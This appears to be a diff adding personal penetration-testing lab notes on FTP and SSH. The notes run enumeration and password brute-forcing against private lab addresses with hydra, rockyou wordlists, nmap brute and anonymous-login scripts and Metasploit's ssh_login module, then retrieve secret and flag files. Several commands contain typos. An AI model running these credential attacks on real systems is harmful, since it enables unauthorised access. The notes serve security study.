@@ -328,6 +328,63 @@ run
 exit
 
 enum4linux -r -u "admin" -p "password1" 192.168.23.3 //looking for users
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+FTP
+ftp 192.168.157.3
+hydra -L /usr/share/metasploit-framework/data/wordlist/common_user.txt -p /usr/share/matasploit-framework/data/wordlist/unix_pass.txt 192.168.157.3 ftp
+
+ftp 192.168.157.3 //give username, passwd
+ls
+help
+get secret.txt
+bye
+ls
+cat secret.txt
+
+echo "sysadmin" >users
+cat users
+
+nmap --script ftp-brute --script-args userdb=/root/users -p21 192.168.157.3
+
+nmap -p21 --script ftp-anon 192.168.157.3
+ftp 192.168.157.3
+get flag
+bye
+cat flag
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+SSH
+---
+ssh root@192.168.23.3
+nc 192.168.23.3 //banner 
+
+nmap -p22 --script ssh2-enu-algos 192.168.23.3
+nmap -p22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.23.3
+nmap -p22 --script ssh-auth-methods --script-args="ss.user=student" 192.168.23.3
+nmap -p22 --script ssh-auth-methods --script-args="ss.user=admin" 192.168.23.3
+ssh student@192.168.23.3
+
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+hydra -l student -P /usr/share/wordlist/rockyou.txt 192.168.23.3
+ssh student@192.168.23.3
+echo "administrator"> user
+nmap -p22 --script ssh-brute --script-args userdb=/root/user 192.168.23.3
+msfconsole
+use auxiliary/scanner/ssh/ssh_login
+show options
+set RHOSTS 192.168.23.3
+set userpass_file /usr/share/wordlist/metasploit/root_userpass.txt
+set STOP_ON_SUCCESS true
+set verbose true
+options
+run
+exit
+ssh root@192.168.23.3
+ls /
+
+
+
 
 
 
